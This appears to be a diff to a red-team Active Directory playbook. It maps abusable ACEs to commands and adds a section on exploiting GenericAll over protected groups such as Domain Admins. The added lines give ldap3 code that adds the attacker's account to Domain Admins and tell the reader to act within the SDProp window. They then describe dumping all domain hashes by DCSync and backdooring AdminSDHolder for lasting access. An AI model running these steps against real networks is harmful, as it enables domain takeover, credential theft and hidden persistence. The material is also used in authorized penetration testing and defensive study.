@@ -43,7 +43,7 @@ Given a discovered ACE (from BloodHound or manual `dacledit`/`ldapsearch` inspec
 | ACE held | On object type | Abuse command |
 |---|---|---|
 | `GenericAll` | User | `impacket-changepasswd $DOMAIN/$USER:$PASS@$DC_IP -newpass 'P@ss!' -altuser TARGET -altpass $PASS` |
-| `GenericAll` | Group | `net rpc group addmem "GROUP" "$USER" -U "$DOMAIN/$USER%$PASS" -S $DC_IP` |
+| `GenericAll` | Group | LDAP: `python3 -c "from ldap3 import *; s=Server('$DC_IP'); c=Connection(s, user='$DOMAIN\\$USER', password='$PASS', authentication=NTLM, auto_bind=True); c.modify('CN=GROUP,CN=Users,DC=...', {'member': [(MODIFY_ADD, ['CN=TARGET,OU=...,DC=...'])]})"`  OR  `net rpc group addmem "GROUP" "$USER" -U "$DOMAIN/$USER%$PASS" -S $DC_IP` (requires RPC). LDAP is faster. |
 | `GenericAll` | Computer | Shadow credentials or RBCD (see below) |
 | `ForceChangePassword` | User | Same as GenericAll password reset: no old password needed |
 | `WriteDacl` | Any | Grant self `GenericAll` first via `dacledit.py`, then abuse as above |
@@ -51,6 +51,27 @@ Given a discovered ACE (from BloodHound or manual `dacledit`/`ldapsearch` inspec
 | `AddMember` | Group | `net rpc group addmem` directly |
 | `GenericWrite` | Computer | Set `msDS-AllowedToActOnBehalfOfOtherIdentity` for RBCD |
 | `GenericWrite` | User | Set an SPN for targeted Kerberoasting, or shadow credentials |
+
+---
+
+## GenericAll on Protected Groups (Domain Admins, Enterprise Admins, Administrators)
+
+**Important:** Protected groups (those with `adminCount=1`) have their ACLs reset by SDProp every 60 minutes to match `CN=AdminSDHolder,CN=System,DC=...`. Any custom ACE placed directly on a protected group will be erased on the next propagation cycle.
+
+**Exploitation:** If you discover `GenericAll` on `Domain Admins` (or other protected group):
+1. **Act immediately** - you have ~60 minutes before SDProp wipes the ACE
+2. Use LDAP to add yourself to the group (faster than RPC):
+```python
+from ldap3 import Server, Connection, NTLM, MODIFY_ADD
+s = Server("DC_IP")
+c = Connection(s, user="DOMAIN\\YOUR_USER", password="PASS", authentication=NTLM, auto_bind=True)
+c.modify("CN=Domain Admins,CN=Users,DC=...,DC=...", {'member': [(MODIFY_ADD, ["CN=YOUR_USER,OU=...,DC=...,DC=..."])]})
+```
+3. **Verify immediately** via remote LDAP (not local AD: provider, which may cache)
+4. Once in the group, DCSync the entire NTDS
+5. For **persistence** (if you need the ACE to last beyond SDProp), grant the ACE on `AdminSDHolder` itself — SDProp will propagate it down instead of erasing it
+
+**Detection gap:** Remote ACL inspection tools (impacket's `dacledit.py`, PowerView.py) may miss `GenericAll` ACEs on protected objects due to LDAP caching or filtering behavior. Always verify critical findings with a direct AD: provider read on the DC itself if possible. Cross-check with PowerShell's `Get-Acl "AD:\..."` on the DC to confirm.
 
 ```bash
 # dacledit: grant GenericAll via WriteDacl
